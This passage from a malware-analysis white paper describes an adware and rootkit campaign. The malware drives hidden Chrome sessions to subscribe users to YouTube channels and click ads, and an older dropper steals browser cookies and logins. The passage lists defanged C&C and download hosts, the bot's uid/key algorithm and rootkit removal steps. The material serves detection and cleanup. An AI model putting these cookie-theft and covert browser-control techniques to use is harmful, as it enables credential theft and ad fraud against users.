Browser.getWindowForTarget\n\n       Browser.setWindowBounds\n\n       Browser.close\n\n       Target.getTargets\n\n       Page.enable\n\n       Page.navigate\n\n       Page.disable\n\n       Page.reload      \n\n       Network.enable\n\n       Network.clearBrowserCache\n\n       Network.disable\n\n       Network.clearBrowserCookies\n\n       Network.setCookies\n\n       Network.getCookies\n\n       Runtime.evaluate\n\n       Runtime.enable\n\n       Runtime.disable\n\n       DOM.setFileInputFiles\n\n\n-----\n\nWhite Paper\n\n######       DOM.enable\n\n       DOM.getDocument\n\n       DOM.disable      \n\n       Input.dispatchMouseEvent\n\n       Input.dispatchKeyEvent\n\nWith the help of the above, it can navigate pages, enter text, click buttons, execute scripts in the page and evaluate variables from\nthe page. If a user happens to be logged in with a Google account, the payload can perform the following interactions with the\nYouTube page received from the C&C:\n\n   - subscribe/unsubscribe to a channel\n\n   - activate/deactivate auto play\n\n   - start/stop a video\n\n   - mute/unmute a video\n\n   - click on advertiser links shown in video ads that precede the actual video\n\n   - click on Skip Ads button displayed after a time in ads\n\n   - click advertiser images shown at the end of a video\n\nThe four YouTube videos we discovered are listed below with the inferred time intervals when they were pushed by this adware:\n\nYouTube Page Started Ended\n\n_https://www.youtube[.]com/watch?v=nF072khSD58_ 28.02.2019 active\n\n_https://www.youtube[.]com/watch?v=q8IqPPEMeP8_ 22.02.2019 27.02.2019\n\n_https://www.youtube[.]com/watch?v=d7TnzoQjoTw_ 21.02.2019\n\n_https://www.youtube[.]com/watch?v=peJ2vpMiU-s_ 02.01.2019\n\nWe could see that more than 3,100 users subscribed overnight to one of those channels, created on 19 February 2019.\n\n|YouTube Page|Started|Ended|\n|---|---|---|\n|https://www.youtube[.]com/watch?v=nF072khSD58|28.02.2019|active|\n|https://www.youtube[.]com/watch?v=q8IqPPEMeP8|22.02.2019|27.02.2019|\n|https://www.youtube[.]com/watch?v=d7TnzoQjoTw||21.02.2019|\n|https://www.youtube[.]com/watch?v=peJ2vpMiU-s|02.01.2019||\n\n\n-----\n\nWhite Paper\n\nWe observed that the authors seem careless about the functionality of their C&C scripts after modifying them.\n\n### HideCreateProcess DLL\n\nHas one export HideCreateProcess which gets one parameter, a command line, and starts the process with that command line. This\nis dynamically loaded by the payload and used to start the Chrome browser in debugging mode. It also injects in the newly created\nprocess the MoveWindow DLL (32bit or 64 bit), for hiding its window.\n\n### MoveWindow DLL\n\n0This component is a DLL that hides the window of the Chrome browser. Window lookup is done by the ClassName **_Chrome__**\n**_WidgetWin__** and then is moved out of the visible screen space. It also uses ITaskbarList COM Interface to hide the taskbar icon. This\nDLL is injected in the Chrome process. It has 32bit and 64bit variants.\n\n### DNS driver rootkit\n\nAs the main rootkit, this is also signed with a certificate issued to 韵羽健康管理咨询（上海）有限公司.\n\nIt starts by registering its device name \\Device\\whttp and registers an IRP_MJ_DEVICE_CONTROL function. The 64bit version of this\nrootkit requires user-mode applications to send 0x83050048 as control code, on 32bit this value is not checked.\n\nThe purpose of this rootkit is to allow a user-mode application to receive or send data over the network through kernel mode. All DNS\nrequests are made through a free public Chinese DNS server 114.114.114.114 - 114DNS[.]com.\n\n### C&C: Key and Uid Algorithm\n\nWith the request made on our test machine as an example, the key and uid identifying the system are generated in the following way:\n\n\n-----\n\nWhite Paper\n\n1. The cpuid instruction is used to extract Version Information and Feature Information of the cpu:\n```\n          mov eax,1\n          cpuid\n          edx -> convert to string1, base 10\n          eax -> convert to string2, base 10\n          concatenate string1, string2\n          Example:\n          edx=0x078BF9FF (126614015)\n          eax=0x000506E3 (329443)\n          s1 = “126614015329443”\n\n```\n2. Get the serial number of the system volume:\n\nGetVolumeInformationA(“C:\\”)\n\nconvert to string, base 10\n\nserialNumber = 0x409c81f1 (1083998705)\n\ns2 = “1083998705”\n\n3. Get the MAC address of the network adapter:\n\ns3 = “08-00-27-8D-4B-18”\n\n4. Concatenate all\n\ns4 = s1 + s2 + s3 = “126614015329443108399870508-00-27-8D-4B-18”\n\n5. MD5 on resulted (s4) string, uppercase:\n\nmd5(s4) = “02B29C602B33B9F9FA38E409AB4332EA”\n\n6. From the MD5, take 16 chars from the 8th one => uid\n\nuid = “02B33B9F9FA38E40”\n\n7. Concatenate uid with “-dl;al20d#@*@()#”\n\ns5 = uid + “-dl;al20d#@*@()#” = “02B33B9F9FA38E40-dl;al20d#@*@()#”\n\n8. MD5 on s5 string => key\n\nkey = md5(s5) = “f1ea2ff3b0068adcd97d1cb1c36fe776”\n\n\n-----\n\nWhite Paper\n\n## Section 11 - OpenURL\n\nWe found this component due to similarities with other modules of the attack. Although we didn’t observe its use during our\ninvestigation, we have strong reasons to believe it belongs to this campaign. The only purpose of this component is to open http://\n**_count.b12[.]fun/jump.php_** in the default browser and then delete itself.\n\n\n-----\n\nWhite Paper\n\n## Other versions of main dropper\n\nOlder versions of the main dropper achieved a similar functionality with slightly different methods. For example, version 1.4 (also\ncharacterised by the appearance of the string demo multiple times which may mean the operation was still in its beginning phases\n– it also is unpacked), used external tools to aid with stealing cookies. Unlike the newer versions of the main dropper, it is only\ncapable of extracting cookies and login data from browsers such as Chrome, Firefox, Internet Explorer and Microsoft Edge. It starts\nby querying a12[.]fun/1.php for a list of websites separated by ”|” which will be used to filter the cookie list and user login credentials.\n\nIf it is loaded on Windows 10, the malware downloads a dedicated application for this task called EdgeCookieView.exe from\n\n**_https://1898799673.rsc.cdn77[.]org/down/EdgeCookiesView.exe and runs this tool with /scookiestxt as parameter. This helps the_**\nmalware decrypt and extract Microsoft Edge’s cookies.\n\nIf \\..\\Local\\Google\\Chrome or \\Mozilla\\Firefox directory exists, it downloads another file – sqlite3.dll, a dynamic link library to be\nused to connect to Chrome and Firefox internal databases to extract the cookie list and user login data from Chrome.\n\nIf the operating system is Windows 7, Windows 8 or Windows 8.1, the cookies will be extracted from Internet Explorer and Microsoft\nEdge by parsing files from the following paths:\n\n###### Microsoft\\Windows\\Cookies\n\n Microsoft\\Windows\\Cookies\\Low\n\n ..\\Local\\Microsoft\\Windows\\InetCookies\n\n ..\\Local\\Microsoft\\Windows\\InetCookies\\Low\n\n ..\\Local\\Microsoft\\Windows\\INetCache\n\n ..\\Local\\Microsoft\\Windows\\INetCache\\Low\n\n ..\\Local\\Packages\\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\\AC\\#!001\n\n ..\\Local\\Packages\\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\\AC\\#!002\n\n ..\\Local\\Packages\\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\\AC\\#!003\n\nBefore sending the collected data to the C&C, it will generate 2 random alphanumeric strings, of size 7 and 9. Data will be encoded\nusing base64 and placed between those 2 generated strings and sent to the C&C.\n\n\n-----\n\nWhite Paper\n\nThis operation is constantly evolving, as demonstrated by the fact that its developers build in new functionalities rather than rely on\nexternal tools that may be detected as malicious. The attackers also started encrypting the dropper to disguise it.\n\n\n-----\n\nWhite Paper\n\n## Other Payload Variants\n\nOther variants of payloads that we found include different C&C addresses:\n\n###### count.b12[.]fun/key\n\n count.b12[.]fun\n\n www.ab12[.]fun/info/info.php\n\n info.d3pk[.]com/history/index.php\n\nSome manipulate other pages instead of YouTube, by interacting with ads displayed inside these pages:\n\nPage manipulated by payload\n\nA completely different payload was pushed by the malware from http://dl.ossdown[.]fun/info02.dat. It represents an Inno Setup\npacked file that bears no resemblance to other payloads in terms of similarity and coding practices. Due to the striking differences\nbetween this payload and other payloads, and the lack of any interaction with other components (except for it being downloaded\nand executed), we believe it does not belong to the attacker. Rather, it’s pushed by a third party through the established botnet. This\nis a very good indicator that the botnet has become attractive enough for third parties to run programs through it in a rent-a-botnet\n\n\n-----\n\nWhite Paper\n\n## Removal Instructions\n\nRootkits are extremely persistent threats and they require special interaction for detection and removal. This section provides stepby-step removal instructions.\n\n**1)** Close your browser(s).\n\n**2)** Kill all processes running from temporary path. Remove files that are detected as malicious.\n\n**3)** Kill rundll32.exe process.\n**4)** Generate the rootkit file name as follows:\n\n       - Get current user’s SID.\n\n       - Compute MD5 of the string resulted from a).\n\n       - Get the first 12 characters from b).\n\n**5)** Run a cmd or PowerShell window with Administrator rights and type:\n\n###### >sc stop <string resulted from step 4\n\n >sc delete <string resulted from step 4\n\n**6)** Go to %WINDIR%\\System32\\drivers and check for a file called <string resulted from step 4>.sys and delete the file.\n\n**7)** Remove the DNS driver (below, MOIYZBWQSO should be replaced with your particular driver name):\n\n       - Check if the DNS driver is installed: in %TEMP% should be a file with 10 random uppercase letters (ex: MOIYZBWQSO.\n**_sys). In the Registry there should also be a key corresponding to the name (ex:_** **_HKEY_LOCAL_MACHINE\\SYSTEM\\_**\n**_CurrentControlSet\\Services\\MOIYZBWQSO)_**\n\n       - Run a cmd or PowerShell window with Administrator rights and type:\n\n**_•_** **_sc stop MOIYZBWQSO_**\n\n       - sc delete MOIYZBWQSO\n\n       - Delete the file %TEMP%\\MOIYZBWQSO.sys\n\n**8)** Reb oot your PC to remove the injected code from the svchost.exe process.\n\n**9)** Remove any suspicious extension from your browsers.\n\n**10)** Change all your passwords.\n\n\n-----\n\nWhite Paper\n\n## IOCs\n\n###
